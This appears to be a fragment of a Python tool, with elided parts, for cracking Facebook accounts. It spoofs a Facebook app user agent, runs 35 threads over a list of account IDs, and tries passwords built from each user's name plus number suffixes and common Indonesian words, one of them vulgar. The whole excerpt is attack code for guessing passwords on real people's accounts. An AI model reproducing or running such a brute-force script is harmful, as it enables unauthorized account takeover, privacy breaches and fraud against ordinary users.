...
class crack:
	...
	def crack(self,user,lala,asu):
		...
		ua=awokawok(["Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
			...
			with Bool(max_workers=35) as kirim:
				...
				for email in id:
					...
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah','indonesia','sayangku','sayangkamu','rahasia','katasandi','cantik','ngentod','babilu','kepolu']
